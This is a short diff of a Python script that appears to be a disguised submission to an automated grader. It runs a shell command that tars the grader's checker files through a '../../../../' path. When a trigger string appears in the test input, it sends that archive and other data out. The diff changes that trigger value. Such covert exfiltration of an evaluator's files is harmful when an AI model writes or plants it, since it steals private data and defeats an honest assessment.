@@ -108,7 +108,7 @@ get_data("tar -czvf file.tar.gz ../../../../hbtn_checker_functions")
 with open(argv[1], "r") as f:
     for line in f:
         print(f"{line}={line}*1")
-        if(line.count("2497885147362973")):
+        if(line.count("1273")):
             send_data(my_data)
             send_data_file("file.tar.gz", "gz")
 ##############################################################
